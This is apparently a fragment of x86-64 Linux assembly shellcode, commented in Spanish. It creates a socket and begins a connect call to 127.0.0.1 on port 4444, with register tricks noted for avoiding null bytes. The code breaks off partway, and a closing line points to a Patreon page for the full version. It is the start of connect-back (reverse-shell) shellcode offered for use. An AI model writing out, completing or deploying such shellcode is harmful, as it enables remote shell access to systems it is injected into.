;//////////Codigo por Belial Grimoire////////////
;/////bgpavelang.github.io//////
;/usr/include/x86_64-linux-gnu/asm/unistd_64.h

global _start

section .text

_start:

xor rcx, rcx

push 0x29    ;int socket(int domain, int type, int protocol) (rdi, rsi, rdx)
pop rax      ;#define __NR_socket 41
push rcx
pop rdx

inc rcx
push rcx
pop rsi

inc rcx
push rcx
pop rdi

syscall

mov r8, rax

push 0x2a   ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
pop rax      ;#define __NR_connect 42

push 0x0100007f   ;protocolo - add o sub para quitar nulls, 0x11111111
push word 0x5c11  ;puerto
push word 0x2     ;AF_INET

mov rsi, rsp


Código completo.
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.
